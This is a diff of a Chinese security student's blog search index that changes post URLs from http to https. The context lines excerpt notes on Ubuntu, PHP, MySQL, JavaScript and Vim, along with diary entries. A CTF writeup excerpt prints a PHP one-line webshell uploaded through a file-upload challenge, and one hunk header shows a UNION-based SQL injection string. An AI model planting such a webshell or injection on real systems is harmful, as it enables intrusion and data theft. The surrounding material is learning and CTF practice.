 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="搜狗输入法"><a href="#搜狗输入法" class="headerlink" title="搜狗输入法"></a>搜狗输入法</h3><p>输入法的安装还是跟Ubuntu 14.10是一样的，但是重启后fcitx不能启动，以致于无法使用搜狗输入法。
 　</p>
@@ -5208,7 +5208,7 @@
     
     <entry>
       <title><![CDATA[Ubuntu 14.10远程登录服务器--ssh的安装和配置]]></title>
-      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Ubuntu-14-10%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8-ssh%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE.html</url>
+      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Ubuntu-14-10%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8-ssh%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ssh是一种安全协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全，现在在需怒江Ubuntu 14.04环境下安装和配置ssh。</p>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="更新源列表"><a href="#更新源列表" class="headerlink" title="更新源列表"></a>更新源列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170224181454.png" alt=""></p>
@@ -5259,7 +5259,7 @@
     
     <entry>
       <title><![CDATA[Ubuntu 14.10安装后的二三事]]></title>
-      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Ubuntu-14-10%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B.html</url>
+      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Ubuntu-14-10%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上课老师用到的是VMware+Ubuntu 14.10，而我用到的是VirtualBox+Ubuntu 14.10。之前我也是用VMware，但是之后就用VirtualBox了。因为VirtualBox开源，而且相较于VMware轻便很多，所占内存小。在VirtualBox下安装完Ubuntu 14.10后在几个问题上折腾了半天，特写一篇博客记下这个过程。</p>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="VMware-tools安装"><a href="#VMware-tools安装" class="headerlink" title="VMware tools安装"></a>VMware tools安装</h3><p>由于我自己用的是VirtualBox，所以用同学的电脑演示一下安装VMware tools。<br>直接贴gif地址吧，博客上上传不了gif图片。<br><a href="http://obr4sfdq7.bkt.clouddn.com/xx.gif" target="_blank" rel="noopener">GIF图片传送门</a></p>
 <p>GIF图片最后一步<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./vmware-install.pl</span><br></pre></td></tr></table></figure></p>
@@ -5313,7 +5313,7 @@
     
     <entry>
       <title><![CDATA[Linux作为服务器操作系统的优势]]></title>
-      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Linux%E4%BD%9C%E4%B8%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BC%98%E5%8A%BF.html</url>
+      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Linux%E4%BD%9C%E4%B8%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BC%98%E5%8A%BF.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>初次在课上听到老师说到，每周需要写博客的作业时。我是很惊讶的，这是第一次在传统的校园课堂拿到一个这么新鲜的作业。这可能就是传统教育与培训教育的不同之处吧。下面是老师留给我们的题目：为什么服务器端的操作系统大多数为Linux？我之前是接触过Linux的，之前用过kali linux，因此在选选修课的时候也就毫不犹豫的选择了Linux基础这门课。检索了别人的文章然后加上自己的想法写下这篇博客。</p>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Linux简介"><a href="#Linux简介" class="headerlink" title="Linux简介"></a>Linux简介</h3><p>Linux是一个自由的，免费的，源码开放的操作系统。也是开源软件中最著名的例子。其最主要的目的就是为了建立不受任何商品化软件版权制约的，全世界都能使用的类Unix兼容产品.而我们将服务器部署在Linux将会更加的稳定、安全、高效以及出色的性能这时windows无法比的。</p>
 <h3 id="Linux优势"><a href="#Linux优势" class="headerlink" title="Linux优势"></a>Linux优势</h3><h4 id="费用低"><a href="#费用低" class="headerlink" title="费用低"></a>费用低</h4><p>费用问题对于一个每一个公司企业是很重的，而服务器的投入是一笔不小的开支，大家都想办法去降低服务器运维和服务器投入的成本问题。而Linux作为一个开源免费的操作系统，无疑得到了大都企业的青睐。企业可以降低更多的服务器成本，以此去填充其他方面的资金不足问题。</p>
@@ -5339,7 +5339,7 @@
     
     <entry>
       <title><![CDATA[《细说PHP》学习笔记]]></title>
-      <url>http://uknowsec.cn/posts/notes/%E3%80%8A%E7%BB%86%E8%AF%B4PHP%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+      <url>https://uknowsec.cn/posts/notes/%E3%80%8A%E7%BB%86%E8%AF%B4PHP%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
       <content type="html"><![CDATA[<p><img src="http://obr4sfdq7.bkt.clouddn.com/t01db525962d3cb177e.jpg" alt="php"></p>
 <h1 id="PHP的基本语法"><a href="#PHP的基本语法" class="headerlink" title="PHP的基本语法"></a>PHP的基本语法</h1><h2 id="PHP第一个程序"><a href="#PHP第一个程序" class="headerlink" title="PHP第一个程序"></a>PHP第一个程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;</span><br><span class="line">		&lt;title&gt;获取服务器信息的第一个PHP程序&lt;/title&gt;	</span><br><span class="line">	&lt;/head&gt;	</span><br><span class="line">	&lt;body&gt;			</span><br><span class="line">&lt;?php		</span><br><span class="line">	$sysos = $_SERVER[&quot;SERVER_SOFTWARE&quot;];	     //获取服务器标识的字串</span><br><span class="line">	$sysversion = PHP_VERSION;                   //获取PHP服务器版本	</span><br><span class="line"></span><br><span class="line">	//以下两条代码连接MySQL数据库并获取MySQL数据库版本信息</span><br><span class="line">	mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;); 	</span><br><span class="line">	$mysqlinfo = mysql_get_server_info();	</span><br><span class="line"></span><br><span class="line">	//从服务器中获取GD库的信息</span><br><span class="line">	if(function_exists(&quot;gd_info&quot;))&#123;                   </span><br><span class="line">		$gd = gd_info();</span><br><span class="line">		$gdinfo = $gd[&apos;GD Version&apos;];</span><br><span class="line">	&#125;else &#123;</span><br><span class="line">		$gdinfo = &quot;未知&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        //从GD库中查看是否支持FreeType字体</span><br><span class="line">	$freetype = $gd[&quot;FreeType Support&quot;] ? &quot;支持&quot; : &quot;不支持&quot;;  </span><br><span class="line">	</span><br><span class="line">	//从PHP配置文件中获得是否可以远程文件获取</span><br><span class="line">	$allowurl= ini_get(&quot;allow_url_fopen&quot;) ? &quot;支持&quot; : &quot;不支持&quot;;</span><br><span class="line">	</span><br><span class="line">	//从PHP配置文件中获得最大上传限制</span><br><span class="line">	$max_upload = ini_get(&quot;file_uploads&quot;) ? ini_get(&quot;upload_max_filesize&quot;) : &quot;Disabled&quot;;</span><br><span class="line">	</span><br><span class="line">	//从PHP配置文件中获得脚本的最大执行时间</span><br><span class="line">	$max_ex_time= ini_get(&quot;max_execution_time&quot;).&quot;秒&quot;;</span><br><span class="line"></span><br><span class="line">	//以下两条获取服务器时间，中国大陆采用的是东八区的时间,设置时区写成Etc/GMT-8</span><br><span class="line">	date_default_timezone_set(&quot;Etc/GMT-8&quot;);</span><br><span class="line">	$systemtime = date(&quot;Y-m-d H:i:s&quot;,time());</span><br><span class="line">	</span><br><span class="line">	/*  *******************************************************************  */	</span><br><span class="line">	/*   以HTML表格的形式将以上获取到的服务器信息输出给客户端浏览器          */	</span><br><span class="line">	/*  *******************************************************************  */	</span><br><span class="line">	echo &quot;&lt;table align=center cellspacing=0 cellpadding=0&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;caption&gt; &lt;h2&gt; 系统信息  &lt;/h2&gt; &lt;/caption&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; Web服务器：    &lt;/td&gt; &lt;td&gt; $sysos        &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;tr&gt; &lt;td&gt; PHP版本：      &lt;/td&gt; &lt;td&gt; $sysversion   &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; MySQL版本：    &lt;/td&gt; &lt;td&gt; $mysqlinfo    &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; GD库版本：     &lt;/td&gt; &lt;td&gt; $gdinfo       &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; FreeType：     &lt;/td&gt; &lt;td&gt; $freetype     &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; 远程文件获取： &lt;/td&gt; &lt;td&gt; $allowurl     &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; 最大上传限制： &lt;/td&gt; &lt;td&gt; $max_upload   &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; 最大执行时间： &lt;/td&gt; &lt;td&gt; $max_ex_time  &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; 服务器时间：   &lt;/td&gt; &lt;td&gt; $systemtime   &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;/table&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 <h3 id="PHP语言标记"><a href="#PHP语言标记" class="headerlink" title="PHP语言标记"></a>PHP语言标记</h3><h4 id="PHP语言嵌入HTML中的位置"><a href="#PHP语言嵌入HTML中的位置" class="headerlink" title="PHP语言嵌入HTML中的位置"></a>PHP语言嵌入HTML中的位置</h4><p>可以将PHP嵌入到以后缀名为.php的HTML文件中的任何地方，只要在文件中使用&lt;?php起始和终止标识符？&gt;就会开启PHP模式</p>
@@ -7493,7 +7493,7 @@
     
     <entry>
       <title><![CDATA[安全牛：网络渗透与深度防御视频-整理笔记]]></title>
-      <url>http://uknowsec.cn/posts/notes/%E5%AE%89%E5%85%A8%E7%89%9B%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E4%B8%8E%E6%B7%B1%E5%BA%A6%E9%98%B2%E5%BE%A1%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0.html</url>
+      <url>https://uknowsec.cn/posts/notes/%E5%AE%89%E5%85%A8%E7%89%9B%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E4%B8%8E%E6%B7%B1%E5%BA%A6%E9%98%B2%E5%BE%A1%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0.html</url>
       <content type="html"><![CDATA[<p><img src="http://obr4sfdq7.bkt.clouddn.com/1622444d95f1718371.png" alt="安全牛"></p>
 <a id="more"></a>
 <h2 id="Web加固"><a href="#Web加固" class="headerlink" title="Web加固"></a>Web加固</h2><h3 id="IIS加固"><a href="#IIS加固" class="headerlink" title="IIS加固"></a>IIS加固</h3><ul>
@@ -7650,7 +7650,7 @@ id=-1 union select database()
     
     <entry>
       <title><![CDATA[智能社：JavaScript教程-从入门到精通视频-整理笔记]]></title>
-      <url>http://uknowsec.cn/posts/notes/%E6%99%BA%E8%83%BD%E7%A4%BE%EF%BC%9AJavaScript%E6%95%99%E7%A8%8B-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E8%A7%86%E9%A2%91%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0.html</url>
+      <url>https://uknowsec.cn/posts/notes/%E6%99%BA%E8%83%BD%E7%A4%BE%EF%BC%9AJavaScript%E6%95%99%E7%A8%8B-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E8%A7%86%E9%A2%91%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0.html</url>
       <content type="html"><![CDATA[<p><img src="http://obr4sfdq7.bkt.clouddn.com/vaBq86vyU_oNsNHGme3T1HWSdJ6vvn6X5xAgtgVzRWvEAQAA_wAAAEpQ.jpg" alt="javascript"></p>
 <h1 id="初探JavaScript魅力-1"><a href="#初探JavaScript魅力-1" class="headerlink" title="初探JavaScript魅力-1"></a>初探JavaScript魅力-1</h1><h2 id="JavaScript是什么"><a href="#JavaScript是什么" class="headerlink" title="JavaScript是什么"></a>JavaScript是什么</h2><p>根据用户的一些操作，然后来修改页面上的一些元素、属性等。</p>
 <p>（1）HTML+CSS静态页面，JS给页面添加动的效果</p>
@@ -9095,7 +9095,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[2016-10-19]]></title>
-      <url>http://uknowsec.cn/posts/life/2016-10-19.html</url>
+      <url>https://uknowsec.cn/posts/life/2016-10-19.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>距上次写博客差不多20多天了，最近也是挺忙的。没时间写博客，专业作业，另外还有的安排、研究院的小组学习任务。没有怎么更新。</p>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>最近在给自己养成一些好的习惯吧！前段时间作息时间有点乱，然后就是作息时间乱，引起各种病痛，缺少体育锻炼吧！尽量早点睡觉，早点起床吧！另外就是学校的学习和自己的个人的学习问题了，感觉很冲突，来不及转换。专业学习的任务还是有这么重的，但是再怎么也不会丢下自己的个人学习。JavaScript还是要在计划中学完吧，然后再自己搞几个小项目实践下。这几天每次去图书馆都屁颠屁颠的往新书架跑，看我荐购的图书有没有上架。可是每次都没上，这是最骚。然后就是下次来了再看看吧。再给自己定一个小小的计划吧！</p>
 <table>
@@ -9139,7 +9139,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[如何在Github Pages搭建自己写的页面？]]></title>
-      <url>http://uknowsec.cn/posts/skill/%E5%A6%82%E4%BD%95%E5%9C%A8Github-Pages%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%9F.html</url>
+      <url>https://uknowsec.cn/posts/skill/%E5%A6%82%E4%BD%95%E5%9C%A8Github-Pages%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%9F.html</url>
       <content type="html"><![CDATA[<p>学了前端小半年，如今写了个自己的网页想要去应聘，却发现部署很麻烦，部署到阿里云之类，买域名啊啥的还要收费，说贵也不贵，但我就是傲娇~</p>
 <p>google一下了解到Github有一个Github pages的功能可以搭建博客或者托管网页，而且免费耶，搜了下教程，猛地一看感觉步骤也不是很麻烦，所以就用这个了！</p>
 <p>教程一大堆，却没有几个能看懂的，问题一：90%的都在讲解如何搭建博客，和我想要将自己的网页部署到上面还是有点区别的。问题二：所有的教程都用到了Git，而我只知道Git是一个开源的分布式版本控制系统。完全不知道命令行是什么鬼，只能照猫画虎的小白来说，那些教程只能帮我到桥头，但想要成功过河，还需要深夜里的一包特浓咖啡。 </p>
@@ -9213,7 +9213,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[2016-09-29]]></title>
-      <url>http://uknowsec.cn/posts/life/2016-09-29.html</url>
+      <url>https://uknowsec.cn/posts/life/2016-09-29.html</url>
       <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>离上次写博客也快二十天了，今天乘刚刚洗了头发没干写一篇博客总结和规划之前和之后的计划吧。</p>
 <h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><p>最近这二十天一直在备战计算机二级，前几天考完二级才有时间来搞之前定下的计划Web开发。学校的研究院招新，就在招新的前一天上午我就和室友去研究院找了老师，具体是因为我跟学长说我想过去搞Web开发（PHP）。在研究院，老师也说了，只要我们能学学了能自己写一些网页。他是有项目的。然后还说了另外的许许。这也让我坚定了开始php学习和php项目的决心，我个人是偏向于web安全的方面的。但是在一次做ctf题目的时候，我才意识到我学好php的重要性。因此我才主动联系了学长，想一起搞个php的项目组。在宣讲填表的时候，我填了web开发和web安全。我希望能从php开发中深刻的学习php,为自己感兴趣的web安全打好基础。不久参加了一个简单的面试，这也是我第一次面试，并没有想象中的那么紧张，而后的分组，我和我两个室友和隔壁宿舍的哥们组成了web开发小组。由于学校研究院也是刚刚成立才一两年，院里没有搞php开发了，学长学姐偏软方向都是搞强类型语言的开发，这就意味着，我们这个小组没人带，我们需要自己白手起家。自己学，自己做。对于我并不感觉这个有多么的失望，反正做什么都是靠自己的。想混吃等死，混混日子并不是我想做的。至此我们组成了一个小的Team，我们都是小白，什么都不懂，什么都要自己学。在成立小组几天后，正在安全公司的一个学长给我发来了一个信息问我想什么时候实习，他们公司缺人，我开始是很惊讶的。我回复说：“大二暑假”。然后他也给我介绍了他们公司的实习待遇和环境氛围。我是很高兴，不管实习的待遇如何，这是一次很好的机会对于我，我可以跟牛逼的人一起学习，这是我很期待的。我很快的答应了他。他也鼓励我好好学技术，在这一年中。我也跟他说了我最近的情况。然后便一直在备战二级，前几天才考完，这几天一直在学习HTML的知识。对于我和我们这个小小的团队，一切从头开始，白手起家。脚踏实地地干。这个才是最重要的。马上也要放国庆假了，刚刚在小组里面讨论了我们国庆的学习任务，国庆自己的计划在这里简单的说下。先把自己的学科（学校的学科）作业完成，然后完成国庆的计划任务。进行下一步的Javascript,Mysql,PHP等一系列的学习，然后鉴于我手上还一本《XSS跨站脚本攻击剖析与防御》，学习学习下xxs的原理和利用吧。</p>
 <h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02 结语"></a>0x02 结语</h2><p>就这样吧！头发也干了！简单的写一篇博客。</p>
@@ -9230,7 +9230,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[Vim编辑器-学习笔记]]></title>
-      <url>http://uknowsec.cn/posts/notes/Vim%E7%BC%96%E8%BE%91%E5%99%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+      <url>https://uknowsec.cn/posts/notes/Vim%E7%BC%96%E8%BE%91%E5%99%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
       <content type="html"><![CDATA[<h1 id="vim快速入门"><a href="#vim快速入门" class="headerlink" title="vim快速入门"></a>vim快速入门</h1><h2 id="vim模式介绍"><a href="#vim模式介绍" class="headerlink" title="vim模式介绍"></a>vim模式介绍</h2><p>以下介绍内容来自维基百科<a href="http://zh.wikipedia.org/wiki/Vim" target="_blank" rel="noopener">Vim</a></p>
 <p>从vi演生出来的Vim具有多种模式，这种独特的设计容易使初学者产生混淆。几乎所有的编辑器都会有插入和执行命令两种模式，并且大多数的编辑器使用了与Vim截然不同的方式：命令目录（鼠标或者键盘驱动），组合键（通常通过control键（CTRL）和alt键（ALT）组成）或者鼠标输入。Vim和vi一样，仅仅通过键盘来在这些模式之中切换。这就使得Vim可以不用进行菜单或者鼠标操作，并且最小化组合键的操作。对文字录入员或者程序员可以大大增强速度和效率。</p>
 <p>Vim具有6种基本模式和5种派生模式，我们这里只简单介绍下6种基本模式：</p>
@@ -9671,7 +9671,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[Linux基础入门笔记]]></title>
-      <url>http://uknowsec.cn/posts/notes/Linux%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0.html</url>
+      <url>https://uknowsec.cn/posts/notes/Linux%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0.html</url>
       <content type="html"><![CDATA[<h1 id="基本概念及操作"><a href="#基本概念及操作" class="headerlink" title="基本概念及操作"></a>基本概念及操作</h1><h2 id="一些常用快捷键"><a href="#一些常用快捷键" class="headerlink" title="一些常用快捷键"></a>一些常用快捷键</h2><table>
 <thead>
 <tr>
@@ -10411,7 +10411,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[百度杯CTF比赛Writeup]]></title>
-      <url>http://uknowsec.cn/posts/ctf/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E6%AF%94%E8%B5%9BWriteup.html</url>
+      <url>https://uknowsec.cn/posts/ctf/%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E6%AF%94%E8%B5%9BWriteup.html</url>
       <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>i春秋和百度联合推出的一个CTF比赛，由于本人太菜。只能随便玩玩，多学多问。<br><img src="http://obr4sfdq7.bkt.clouddn.com/psb.jpg" alt=""></p>
 <h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>Upload<br>描述：想怎么传就怎么传，就是这么任性。<br>tips:flag在flag.php中    </p>
 <h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开题目题目链接，是一个文件上传的题。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224648.png" alt=""><br>然后打开/flag.php<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224800.png" alt=""><br>直接上传传统的PHP一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval_r($_POST[sb])?&gt;</span><br></pre></td></tr></table></figure></p>
@@ -10442,7 +10442,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[MySQL数据库基础与实例]]></title>
-      <url>http://uknowsec.cn/posts/notes/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%9E%E4%BE%8B.html</url>
+      <url>https://uknowsec.cn/posts/notes/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%9E%E4%BE%8B.html</url>
       <content type="html"><![CDATA[<h1 id="MySQL基础知识"><a href="#MySQL基础知识" class="headerlink" title="MySQL基础知识"></a>MySQL基础知识</h1><p>MySQL是最受欢迎的开源关系数据库管理系统，有瑞典MySQL AB公司开发。2008年1月MySQL被美国的SUN公司收购，2009年4月SUN公司又被美国的甲骨文（Oracle）公司收购。</p>
 <h2 id="MySQL的特点"><a href="#MySQL的特点" class="headerlink" title="MySQL的特点"></a>MySQL的特点</h2><p>MySQL是一个单进程多线程、支持多用户、基于客户机/服务端（Client/Server， C/S）的关系数据库管理系统。与其他数据库管理系统（DBMS）相比，MySQL具有体积小、易于安装、运行速度快、功能齐全、成本低廉、开源、性能高效、跨平台支持、简单易用以及支持多用户等特点。</p>
 <h2 id="MySQL服务器的安装"><a href="#MySQL服务器的安装" class="headerlink" title="MySQL服务器的安装"></a>MySQL服务器的安装</h2><p><a href="https://www.baidu.com/s?ie=utf-8&amp;f=3&amp;rsv_bp=1&amp;tn=monline_3_dg&amp;wd=mysql%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B&amp;oq=MySQL%E7%9A%84%E4%BD%BF%E7%94%A8%E6%B5%81%E7%A8%8B%E5%9B%BE&amp;rsv_pq=b00d663c00006bf5&amp;rsv_t=b75foeWyNzqw1JsrhOMySTBjWEBnJT3RNpfrmv8xNT4d2xAaW4fs%2FO1%2BnJwFxWv%2BPzR6&amp;rqlang=cn&amp;rsv_enter=1&amp;inputT=4620&amp;rsv_sug3=36&amp;rsv_sug1=16&amp;rsv_sug7=100&amp;rsv_sug2=1&amp;prefixsug=MySQL%E5%AE%89%E8%A3%85&amp;rsp=0&amp;rsv_sug4=7744" target="_blank" rel="noopener">mysql安装教程</a></p>
@@ -10493,7 +10493,7 @@ HTML DOM - 针对 HTML 文档的标准模型
     
     <entry>
       <title><![CDATA[Web安全与攻击技术-基础知识]]></title>
-      <url>http://uknowsec.cn/posts/notes/Web%E5%AE%89%E5%85%A8%E4%B8%8E%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html</url>
+      <url>https://uknowsec.cn/posts/notes/Web%E5%AE%89%E5%85%A8%E4%B8%8E%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html</url>
       <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="0x01-HTTP协议"><a href="#0x01-HTTP协议" class="headerlink" title="0x01 HTTP协议"></a>0x01 HTTP协议</h2><p>超文本传送协议（Hypertext Transport Protocol , HTTP）是分布式、协作式、超媒体系统应用之间的通信协议，是万维网（World Wide Web）交换信息的基础。HTTP是一个客户端终端（用户）和服务端（网站）请求和应答的标准（TCP）。通过使用Web浏览器、网络爬虫或者其他工具，客户端发起一个HTTP请求到服务器上指定端口（默认端口为80），称这个客户端为用户代理程序。通常，有HTTP客户端发起一个请求，创建一个到服务器指定端口（默认端口为80端口）的TCP连接。HTTO服务器则在那个端口监听客户端的请求。一旦收到请求，服务器会向客户端返回一个状态，如“HTTP/1.1 200 OK”及返回的内容（请求的文件、错误信息、或者其他信息）。</p>
